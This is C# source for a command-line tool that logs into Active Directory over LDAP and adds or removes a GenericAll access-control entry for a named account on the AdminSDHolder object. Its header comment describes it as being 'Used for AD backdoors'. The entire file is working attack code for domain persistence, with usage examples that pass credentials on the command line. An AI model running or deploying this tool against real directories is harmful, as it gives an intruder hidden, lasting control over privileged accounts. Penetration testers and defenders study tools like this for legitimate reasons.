using System;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Net.NetworkInformation;

/*
 * Authenticates to LDAP using the provided username and password and adds or deletes a domain account from the AdminSDHolder object ACL. Used for AD backdoors.
 * Usage: AdminSDHolderLDAP.exe auth_username auth_password account_to_add [add/delete] [novalidate/check]
 * 
 * Example Check what would be added on run, but do not add: 
 *      AdminSDHolderLDAP.exe Alice Summer2020 Joe add check
 *
 * Example Add domain user joe to AdminSDHolder object with prompts (safe way): 
 *      AdminSDHolderLDAP.exe Alice Summer2020 Joe add
 * 
 * 
 * Example Delete domain user joe from AdminSDHolder object with prompts (safe way): 
 *      AdminSDHolderLDAP.exe Alice Summer2020 Joe delete
 * 
 * Note: This is designed to be run on a domain-joined system and identifies the domain controller+LDAP server via Environment.UserDomainName. Modify this if targeting a different host.
 * 
 * @ac3lives, 2021
 */
namespace AdminSDHolder
{
    class Program
    {
        static void Main(string[] args)
        {
            //arg[0] = Username to authenticate to LDAP with
            //arg[1] = password to authenticate to LDAP with
            //arg[2] = user to add to AdminSDHolder
            //arg[3] = add or delete from the property?
            //arg[4] = Enter "novalidate" to skip prompts and auto-do it, or "check" to check what changes would be made without applying them.

            bool novalidate = false;
            bool check = false;
            if(args[3] == "add" || args[3] == "delete")
            {
                Console.WriteLine("Running in '{0}' mode", args[3]);
            }
            else
            {
                Console.WriteLine("Invalid, exiting. Fourth argument should be 'add' or 'delete'");
                Environment.Exit(0);
            }
            if(args.Length == 5)
            {
                if(args[4] == "novalidate")
                {
                    Console.WriteLine("WARNING: Running without approval prompts. This will automatically modify attributes. Ensure there are no typos, and run once without this flag.");
                    novalidate = true;
                }
                if(args[4] == "check")
                {
                    Console.WriteLine("Running in check mode, will not apply changes");
                    check = true;
                }
            }

            string FQDN = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            string DomainName = Environment.UserDomainName;
            string SearchBase = "LDAP://" + DomainName.Replace(".", ",DC=");
            string filterCN = "DC=" + FQDN.Replace(".", ",DC=");
            string searchFilter = "(distinguishedName=CN=AdminSDHolder,CN=System," + filterCN + ")";
            Console.WriteLine("Connecting to {0}", SearchBase);
            DirectoryEntry Entry = new DirectoryEntry(SearchBase, args[0], args[1]);

            DirectorySearcher Searcher = new DirectorySearcher(Entry);
            Searcher.SearchScope = SearchScope.Subtree;
            //Searcher.PropertiesToLoad.Add("sAMAccountName");
            Console.WriteLine("Setting LDAP search filter to {0}: ", searchFilter);
            Searcher.Filter = searchFilter;

            foreach (SearchResult AdObj in Searcher.FindAll())
            {
                try
                {
                    Console.WriteLine("Found object: {0}", Convert.ToString(AdObj.Properties["distinguishedName"][0]));
                    DirectoryEntry adminsdholder = AdObj.GetDirectoryEntry();
                    ActiveDirectorySecurity sec = adminsdholder.ObjectSecurity;

                    
                    ActiveDirectoryAccessRule rule = new ActiveDirectoryAccessRule(new NTAccount(DomainName, args[2]), ActiveDirectoryRights.GenericAll, AccessControlType.Allow);
                    PrintAce(rule);
                    if(!check)
                    {
                        if (!novalidate)
                        {
                            if(args[3] == "add")
                            {
                                Console.WriteLine("User account: {0}\\{1} will be added to AdminSDHolder", DomainName, args[2]);
                                Console.WriteLine("\n\nAre you sure you want to continue? [yes/no]");
                                if (Console.ReadLine() == "yes")
                                {
                                    sec.AddAccessRule(rule);
                                    adminsdholder.CommitChanges();
                                }
                                else
                                {
                                    Console.WriteLine("Quitting...");
                                }
                            }
                            else if (args[3] == "delete")
                            {
                                Console.WriteLine("User account: {0}\\{1} will be DELETED from AdminSDHolder", DomainName, args[2]);
                                Console.WriteLine("\n\nAre you sure you want to continue? [yes/no]");
                                if (Console.ReadLine() == "yes")
                                {
                                    sec.RemoveAccessRule(rule);
                                    adminsdholder.CommitChanges();
                                }
                                else
                                {
                                    Console.WriteLine("Quitting...");
                                }
                            }

                        }
                        else
                        {
                            if (args[3] == "add")
                            {
                                sec.AddAccessRule(rule);
                                adminsdholder.CommitChanges();
                                Console.WriteLine("User account: {0}\\{1} added to AdminSDHolder", DomainName, args[2]);
                            }
                            else if (args[3] == "delete")
                            {
                                sec.RemoveAccessRule(rule);
                                adminsdholder.CommitChanges();
                                Console.WriteLine("User account: {0}\\{1} DELETED from AdminSDHolder", DomainName, args[2]);
                            }

                        }
                    }               
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error: {0}", e.Message);
                    Console.WriteLine("StackTrace: {0}", e.StackTrace);
                    Console.WriteLine("TargetSite: {0}", e.TargetSite);
                }

            }
        }
        public static void PrintAce(ActiveDirectoryAccessRule rule)
        {
            Console.WriteLine("Description for the ACE being modified: ");
            Console.WriteLine("=====ACE=====");
            Console.Write(" Identity: ");
            Console.WriteLine(rule.IdentityReference.ToString());
            Console.Write(" AccessControlType: ");
            Console.WriteLine(rule.AccessControlType.ToString());
            Console.Write(" ActiveDirectoryRights: ");
            Console.WriteLine(
            rule.ActiveDirectoryRights.ToString());
            Console.Write(" InheritanceType: ");
            Console.WriteLine(rule.InheritanceType.ToString());
            Console.Write(" ObjectType: ");
            if (rule.ObjectType == Guid.Empty)
                Console.WriteLine("");
            else
                Console.WriteLine(rule.ObjectType.ToString());

            Console.Write(" InheritedObjectType: ");
            if (rule.InheritedObjectType == Guid.Empty)
                Console.WriteLine("");
            else
                Console.WriteLine(
                rule.InheritedObjectType.ToString());
            Console.Write(" ObjectFlags: ");
            Console.WriteLine(rule.ObjectFlags.ToString());
        }
    }
}
